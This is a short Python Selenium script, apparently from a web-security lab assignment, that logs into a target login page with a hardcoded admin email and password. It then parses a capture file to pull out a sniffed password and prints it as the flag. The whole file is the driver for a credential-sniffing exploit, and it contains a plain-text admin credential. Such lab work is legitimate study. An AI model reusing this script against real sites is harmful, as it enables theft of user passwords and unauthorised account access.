import time, re
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

caps = DesiredCapabilities.FIREFOX
caps["marionette"] = True
caps["binary"] = "/usr/bin/firefox"
print("Logging as admin and sniffing his password")
driver = webdriver.Firefox(capabilities=caps, executable_path='./exploit16/geckodriver')
driver.get("http://www.wsb.com/Assignment2/case20/login.php")
email_field = driver.find_element_by_name('email')
password_field = driver.find_element_by_name('password')
login_button = driver.find_element_by_xpath('//input[3]')

email_field.send_keys('admin@admin.com')
password_field.send_keys('6yEJedUJsxsQY2s')
login_button.click()

driver.quit()
time.sleep(5)

password_regex=re.compile("password=&p=(.*)")
password = ''
with open('exploit20/results.txt') as capture_file:
	for line in iter(capture_file.readline,''):
		match = password_regex.search(line)
		if match:
				password = match.group(1)
print("Flag is" + password)